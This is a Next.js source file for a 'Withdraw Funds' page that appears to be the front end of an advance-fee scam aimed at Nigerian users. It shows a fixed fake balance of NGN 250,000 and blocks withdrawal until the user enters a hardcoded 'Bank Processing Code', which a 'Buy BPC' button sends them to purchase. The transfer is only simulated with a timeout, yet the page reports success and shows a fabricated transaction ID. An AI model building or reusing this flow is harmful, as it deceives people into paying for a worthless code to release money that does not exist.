'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'
import {
  ArrowLeft,
  DollarSign,
  CheckCircle,
  AlertCircle,
  Loader,
  Eye,
  EyeOff,
} from 'lucide-react'

const CORRECT_BPC_CODE = 'BPC2026_PRO_V30_650'

export default function WithdrawPage() {
  const router = useRouter()
  const [step, setStep] = useState<'form' | 'confirm' | 'success'>('form')
  const [amount, setAmount] = useState('')
  const [selectedBank, setSelectedBank] = useState('')
  const [accountNumber, setAccountNumber] = useState('')
  const [accountName, setAccountName] = useState('')
  const [bpcCode, setBpcCode] = useState('')
  const [showBpcCode, setShowBpcCode] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState('')
  const [bpcError, setBpcError] = useState('')

  const banks = [
    { name: 'OPAY', code: 'OPAY' },
    { name: 'PALMPAY', code: 'PALMPAY' },
    { name: 'MONIEPOINT', code: 'MONIEPOINT' },
    { name: 'SMART CASH', code: 'SMARTCASH' },
    { name: '9JA BANK', code: '9JA' },
    { name: 'MOMO MFB', code: 'MOMO' },
    { name: 'PAYSTACK TITAN', code: 'PAYSTACK' },
    { name: 'MOREMONEE', code: 'MOREMONEE' },
    { name: 'Stanbic IBTC', code: '221' },
    { name: 'FAIRMONEY', code: 'FAIRMONEY' },
    { name: 'CITI BANK', code: '023' },
    { name: 'LAPO MICROFINANCE BANK', code: 'LAPO' },
    { name: 'Access Bank', code: '044' },
    { name: 'GTBank', code: '007' },
    { name: 'First Bank', code: '011' },
    { name: 'UBA', code: '033' },
    { name: 'Zenith Bank', code: '050' },
    { name: 'Fidelity Bank', code: '070' },
    { name: 'FCMB', code: '214' },
    { name: 'Standard Chartered', code: '068' },
  ]

  const validateForm = () => {
    if (!amount || parseFloat(amount) <= 0) {
      setError('Please enter a valid amount')
      return false
    }
    if (parseFloat(amount) > 250000) {
      setError('Insufficient balance. Maximum withdrawal: NGN 250,000')
      return false
    }
    if (parseFloat(amount) < 500) {
      setError('Minimum withdrawal amount is NGN 500')
      return false
    }
    if (!selectedBank) {
      setError('Please select a bank')
      return false
    }
    if (!accountNumber || accountNumber.length < 10) {
      setError('Please enter a valid account number')
      return false
    }
    if (!accountName) {
      setError('Please enter the account holder name')
      return false
    }
    if (!bpcCode) {
      setBpcError('Please enter BPC CODE')
      return false
    }
    if (bpcCode !== CORRECT_BPC_CODE) {
      setBpcError('Wrong Bank Processing Code (BPC CODE). Kindly get the correct code to proceed with the transaction.')
      return false
    }
    return true
  }

  const handleContinue = () => {
    setError('')
    if (validateForm()) {
      setStep('confirm')
    }
  }

  const handleConfirm = async () => {
    setIsLoading(true)
    setError('')
    
    try {
      // Simulate API call
      await new Promise((resolve) => setTimeout(resolve, 2000))
      
      // In a real app, you would make an API call to process the withdrawal
      // const response = await fetch('/api/withdraw', {
      //   method: 'POST',
      //   headers: { 'Content-Type': 'application/json' },
      //   body: JSON.stringify({
      //     amount: parseFloat(amount),
      //     bank: selectedBank,
      //     accountNumber,
      //     accountName,
      //   }),
      // })
      
      setStep('success')
    } catch (err) {
      setError('Failed to process withdrawal. Please try again.')
    } finally {
      setIsLoading(false)
    }
  }

  const handleBack = () => {
    if (step === 'form') {
      router.back()
    } else if (step === 'confirm') {
      setStep('form')
      setError('')
    } else {
      router.push('/dashboard')
    }
  }

  const selectedBankObj = banks.find((b) => b.name === selectedBank)

  return (
    <div className="min-h-screen bg-white pb-6">
      {/* Header */}
      <header className="sticky top-0 z-40 bg-white border-b border-gray-100">
        <div className="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between">
          <button
            onClick={handleBack}
            className="p-2 hover:bg-gray-100 rounded-lg transition"
          >
            <ArrowLeft className="w-6 h-6 text-gray-900" />
          </button>
          <h1 className="text-lg font-bold text-gray-900">Withdraw Funds</h1>
          <div className="w-10" />
        </div>
      </header>

      <main className="max-w-sm mx-auto px-4 py-6">
        {/* Progress Indicator */}
        <div className="flex gap-2 mb-8">
          <div
            className={`flex-1 h-1 rounded-full ${
              step === 'form' || step === 'confirm' || step === 'success'
                ? 'bg-[#0000ff]'
                : 'bg-gray-200'
            }`}
          />
          <div
            className={`flex-1 h-1 rounded-full ${
              step === 'confirm' || step === 'success'
                ? 'bg-[#0000ff]'
                : 'bg-gray-200'
            }`}
          />
          <div
            className={`flex-1 h-1 rounded-full ${
              step === 'success' ? 'bg-[#0000ff]' : 'bg-gray-200'
            }`}
          />
        </div>

        {/* Form Step */}
        {step === 'form' && (
          <div className="space-y-6">
            {/* Amount Input */}
            <div>
              <label className="block text-sm font-semibold text-gray-900 mb-3">
                Withdrawal Amount
              </label>
              <div className="relative">
                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 font-semibold">
                  ₦
                </span>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="Enter amount"
                  className="w-full pl-8 pr-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] focus:border-transparent"
                />
              </div>
              <p className="text-xs text-gray-600 mt-2">
                Available balance: NGN 250,000.00
              </p>
            </div>

            {/* Quick Amount Buttons */}
            <div>
              <p className="text-xs text-gray-600 mb-3">Quick amounts</p>
              <div className="grid grid-cols-4 gap-2">
                {['5000', '10000', '25000', '50000'].map((quickAmount) => (
                  <button
                    key={quickAmount}
                    onClick={() => setAmount(quickAmount)}
                    className={`py-2 px-3 rounded-lg font-semibold text-sm transition ${
                      amount === quickAmount
                        ? 'bg-[#0000ff] text-white'
                        : 'bg-gray-100 text-gray-900 hover:bg-gray-200'
                    }`}
                  >
                    ₦{parseInt(quickAmount).toLocaleString()}
                  </button>
                ))}
              </div>
            </div>

            {/* Bank Selection */}
            <div>
              <label className="block text-sm font-semibold text-gray-900 mb-3">
                Select Bank
              </label>
              <select
                value={selectedBank}
                onChange={(e) => setSelectedBank(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] focus:border-transparent"
              >
                <option value="">Choose your bank</option>
                {banks.map((bank) => (
                  <option key={bank.code} value={bank.name}>
                    {bank.name}
                  </option>
                ))}
              </select>
            </div>

            {/* Account Number */}
            <div>
              <label className="block text-sm font-semibold text-gray-900 mb-3">
                Account Number
              </label>
              <input
                type="text"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ''))}
                placeholder="10 digit account number"
                className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] focus:border-transparent"
              />
            </div>

            {/* Account Name */}
            <div>
              <label className="block text-sm font-semibold text-gray-900 mb-3">
                Account Holder Name
              </label>
              <input
                type="text"
                value={accountName}
                onChange={(e) => setAccountName(e.target.value)}
                placeholder="Full name as shown on bank account"
                className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] focus:border-transparent"
              />
            </div>

            {/* BPC CODE Input */}
            <div>
              <label className="block text-sm font-semibold text-gray-900 mb-3">
                INPUT BPC CODE
              </label>
              <div className="relative">
                <input
                  type={showBpcCode ? 'text' : 'password'}
                  value={bpcCode}
                  onChange={(e) => {
                    setBpcCode(e.target.value)
                    setBpcError('')
                  }}
                  placeholder="Enter BPC Code"
                  className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#0000ff] pr-10"
                  maxLength={CORRECT_BPC_CODE.length}
                />
                <button
                  type="button"
                  onClick={() => setShowBpcCode(!showBpcCode)}
                  className="absolute right-3 top-3 text-gray-500 hover:text-gray-700"
                >
                  {showBpcCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
              <button
                type="button"
                onClick={() => router.push('/buy-bpc')}
                className="text-[#0000ff] hover:text-blue-700 text-sm font-semibold mt-2"
              >
                Buy BPC
              </button>
            </div>

            {bpcError && (
              <div className="flex gap-3 p-4 bg-red-50 border border-red-200 rounded-xl">
                <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                <p className="text-sm text-red-700">{bpcError}</p>
              </div>
            )}

            {/* Error Message */}
            {error && (
              <div className="flex gap-3 p-4 bg-red-50 border border-red-200 rounded-xl">
                <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                <p className="text-sm text-red-700">{error}</p>
              </div>
            )}

            {/* Charges Info */}
            <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
              <p className="text-xs text-gray-600 mb-2 font-semibold">
                Withdrawal Charges
              </p>
              <div className="space-y-1">
                <div className="flex justify-between text-sm">
                  <span className="text-gray-700">Amount:</span>
                  <span className="font-semibold text-gray-900">
                    ₦{amount ? parseInt(amount).toLocaleString() : '0'}
                  </span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-700">Processing Fee:</span>
                  <span className="font-semibold text-gray-900">₦100</span>
                </div>
                <div className="h-px bg-blue-200 my-2" />
                <div className="flex justify-between text-sm">
                  <span className="text-gray-700 font-semibold">Total Debit:</span>
                  <span className="font-bold text-[#0000ff]">
                    ₦{amount ? (parseInt(amount) + 100).toLocaleString() : '100'}
                  </span>
                </div>
              </div>
            </div>

            {/* Continue Button */}
            <button
              onClick={handleContinue}
              className="w-full bg-[#0000ff] text-white font-semibold py-3 rounded-xl hover:opacity-90 transition mt-6"
            >
              Review & Confirm
            </button>
          </div>
        )}

        {/* Confirmation Step */}
        {step === 'confirm' && (
          <div className="space-y-6">
            {/* Summary */}
            <div className="bg-gray-50 rounded-2xl p-6 space-y-4">
              <h2 className="text-lg font-bold text-gray-900">
                Confirm Withdrawal
              </h2>
              
              <div className="space-y-4 py-4 border-t border-b border-gray-200">
                <div className="flex justify-between">
                  <span className="text-gray-600">Amount</span>
                  <span className="font-bold text-gray-900">
                    ₦{parseInt(amount).toLocaleString()}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Processing Fee</span>
                  <span className="font-semibold text-gray-900">₦100</span>
                </div>
                <div className="flex justify-between text-lg">
                  <span className="font-semibold text-gray-900">Total Debit</span>
                  <span className="font-bold text-[#0000ff]">
                    ₦{(parseInt(amount) + 100).toLocaleString()}
                  </span>
                </div>
              </div>

              <div className="space-y-3 pt-2">
                <div>
                  <p className="text-xs text-gray-600 mb-1">Destination Bank</p>
                  <p className="font-semibold text-gray-900">{selectedBank}</p>
                </div>
                <div>
                  <p className="text-xs text-gray-600 mb-1">Account Number</p>
                  <p className="font-semibold text-gray-900">
                    {accountNumber.slice(-4).padStart(accountNumber.length, '*')}
                  </p>
                </div>
                <div>
                  <p className="text-xs text-gray-600 mb-1">Account Name</p>
                  <p className="font-semibold text-gray-900">{accountName}</p>
                </div>
              </div>
            </div>

            {/* Warning */}
            <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 flex gap-3">
              <AlertCircle className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" />
              <p className="text-sm text-amber-800">
                Please ensure all details are correct. Incorrect account information may result in loss of funds.
              </p>
            </div>

            {/* Error Message */}
            {error && (
              <div className="flex gap-3 p-4 bg-red-50 border border-red-200 rounded-xl">
                <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
                <p className="text-sm text-red-700">{error}</p>
              </div>
            )}

            {/* Action Buttons */}
            <div className="space-y-3">
              <button
                onClick={handleConfirm}
                disabled={isLoading}
                className="w-full bg-[#0000ff] text-white font-semibold py-3 rounded-xl hover:opacity-90 transition disabled:opacity-50 flex items-center justify-center gap-2"
              >
                {isLoading ? (
                  <>
                    <Loader className="w-5 h-5 animate-spin" />
                    Processing...
                  </>
                ) : (
                  'Confirm Withdrawal'
                )}
              </button>
              <button
                onClick={() => setStep('form')}
                disabled={isLoading}
                className="w-full bg-gray-100 text-gray-900 font-semibold py-3 rounded-xl hover:bg-gray-200 transition disabled:opacity-50"
              >
                Edit Details
              </button>
            </div>
          </div>
        )}

        {/* Success Step */}
        {step === 'success' && (
          <div className="space-y-6 text-center py-8">
            {/* Success Icon */}
            <div className="flex justify-center mb-4">
              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center">
                <CheckCircle className="w-12 h-12 text-green-600" />
              </div>
            </div>

            {/* Success Message */}
            <div>
              <h2 className="text-2xl font-bold text-gray-900 mb-2">
                Withdrawal Successful!
              </h2>
              <p className="text-gray-600">
                Your withdrawal request has been processed.
              </p>
            </div>

            {/* Details */}
            <div className="bg-gray-50 rounded-2xl p-6 space-y-3 text-left mt-6">
              <div className="flex justify-between">
                <span className="text-gray-600">Amount</span>
                <span className="font-bold text-gray-900">
                  ₦{parseInt(amount).toLocaleString()}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Destination</span>
                <span className="font-semibold text-gray-900">
                  {selectedBank}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Status</span>
                <span className="font-semibold text-green-600">Processing</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Transaction ID</span>
                <span className="font-mono text-sm text-gray-900">
                  TX{Date.now().toString().slice(-8)}
                </span>
              </div>
            </div>

            {/* Info Message */}
            <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 text-left">
              <p className="text-sm text-blue-900">
                <span className="font-semibold">Estimated Arrival:</span> 5 minutes - 1 hour. 
                You'll receive a confirmation email once the transfer is complete.
              </p>
            </div>

            {/* Action Buttons */}
            <div className="space-y-3">
              <button
                onClick={() => router.push('/dashboard')}
                className="w-full bg-[#0000ff] text-white font-semibold py-3 rounded-xl hover:opacity-90 transition"
              >
                Back to Dashboard
              </button>
              <button
                onClick={() => {
                  setStep('form')
                  setAmount('')
                  setSelectedBank('')
                  setAccountNumber('')
                  setAccountName('')
                  setError('')
                }}
                className="w-full bg-gray-100 text-gray-900 font-semibold py-3 rounded-xl hover:bg-gray-200 transition"
              >
                Make Another Withdrawal
              </button>
            </div>
          </div>
        )}
      </main>
    </div>
  )
}
